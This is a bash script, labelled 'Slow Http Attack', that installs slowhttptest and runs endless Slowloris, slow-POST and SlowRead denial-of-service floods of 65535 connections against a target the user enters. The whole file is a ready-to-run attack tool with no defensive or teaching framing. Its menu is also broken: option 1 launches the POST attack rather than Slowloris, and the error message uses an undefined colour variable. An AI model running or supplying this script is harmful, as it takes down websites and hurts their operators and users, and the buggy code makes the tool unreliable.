#!/bin/bash
# Author: hybfkuf
# Creaet Date: 2020-02-02
# Version: 1.0
# Description: Slow Http Attack

EXIT_SUCCESS=0
EXIT_FAILURE=1

RED="\E[1;31m"
GREEN="\E[1;32m"
YELLOW="\E[1;33m"
BLUE="\E[1;34m"
RES="\E[0m"

ATTACK="/usr/bin/slowhttptest"
read -r -p "Dos Target: " TARGET



if [ ! -f "$ATTACK" ]; then
    echo -e "${GREEN}apt-get update ......${RES}"
    apt-get update &> /dev/null
    echo -e "${GREEN}apt-get install slowhttptest ......${RES}"
    apt-get install -y slowhttptest &> /dev/null
fi


if [ -z "$TARGET" ]; then
    echo -e "${RED}target not found ${RES}"
    exit $EXIT_FAILURE
fi

echo -e "${BLUE}============${RES}"
echo -e "${BLUE}1:Slowloris${RES}"
echo -e "${BLUE}2:HTTP Post${RES}"
echo -e "${BLUE}3:SlowRead${RES}"
read -r -p "Choose number: " num

Slowloris() {
    while true
    do
        slowhttptest -c 65535 -H -i 10 -r 200 -t GET -u "$TARGET" &
        slowhttptest -c 65535 -H -i 10 -r 200 -t GET -u "$TARGET" &
        sleep 2m
    done
}
HttpPost() {
    while true
    do
        slowhttptest -c 65535 -B -i 10 -r 200 -s 8192 -t FAKEVERB -u "$TARGET" &
        slowhttptest -c 65535 -B -i 10 -r 200 -s 8192 -t FAKEVERB -u "$TARGET" &
        sleep 2m
    done
}
SlowRead() {
    while true
    do
        slowhttptest -c 65535 -X -i 10 -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u "$TARGET" &
        slowhttptest -c 65535 -X -i 10 -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u "$TARGET" &
        sleep 2m
    done
}

case "$num" in
    1)
        HttpPost
        ;;
    2)
        HttpPost
        ;;
    3)
        SlowRead
        ;;
    *)
        echo -e "${READ} You not choosen one number !{RES}"
esac
